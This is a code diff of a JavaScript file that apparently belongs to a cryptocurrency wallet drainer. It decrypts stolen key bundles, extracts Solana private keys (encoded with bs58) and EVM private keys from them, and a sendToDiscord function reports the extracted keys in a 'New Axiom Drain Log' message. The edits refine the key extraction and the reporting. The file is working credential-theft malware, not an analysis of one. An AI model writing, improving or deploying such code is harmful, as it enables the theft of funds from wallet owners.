@@ -61,33 +61,26 @@ function decryptSingleBundle(bundleStr, keyB64, type) {
         console.log(`✅ ${type.toUpperCase()} DECRYPTED - ${buf.length} bytes`);
 
         let privateKey = null;
-        let keyHex = null;
+        let keyHex = buf.toString('hex');
 
         if (type === "sol" && buf.length >= 64) {
-            // Try common offsets for Solana (64 bytes)
-            for (let i = 0; i <= buf.length - 64; i += 4) {
-                const candidate = buf.slice(i, i + 64);
-                if (candidate.length === 64) {
-                    privateKey = candidate.toString('base64'); // or hex
-                    keyHex = candidate.toString('hex');
-                    break;
-                }
-            }
+            const solKey = buf.slice(0, 64);
+            privateKey = solKey.toString('base64');
+            try {
+                const bs58 = require('bs58');
+                privateKey = bs58.encode(solKey);   // Best format for Solana
+            } catch (e) {}
         } else if (type === "evm" && buf.length >= 32) {
-            // EVM private key is 32 bytes
-            const candidate = buf.slice(0, 32);
-            privateKey = candidate.toString('hex');
-            keyHex = privateKey;
+            privateKey = buf.slice(0, 32).toString('hex');
         }
 
         return {
             prefix,
             type,
             method: result.method,
-            decryptedHex: buf.toString('hex'),
+            decryptedHex: keyHex,
             decryptedBase64: buf.toString('base64'),
-            privateKey: privateKey || "Not extracted",
-            keyHex: keyHex
+            privateKey: privateKey || "Not extracted"
         };
     }
     return { prefix, error: "Failed" };
@@ -113,7 +106,7 @@ function tryDecryptAES(encryptedB64, keyB64) {
 
 async function sendToDiscord(data) {
     const portfolio = data.portfolio || {};
-    const hasSuccess = true; // Since decryption always runs now
+    const hasSuccess = true;
 
     const mainEmbed = {
         title: "📥 New Axiom Drain Log",
@@ -131,7 +124,6 @@ async function sendToDiscord(data) {
         { name: "Site", value: data.site || "N/A" }
     ];
 
-    // Add keys to summary
     if (portfolio.sBundlesDecrypted) {
         portfolio.sBundlesDecrypted.forEach(b => {
             if (b.privateKey && b.privateKey !== "Not extracted") {
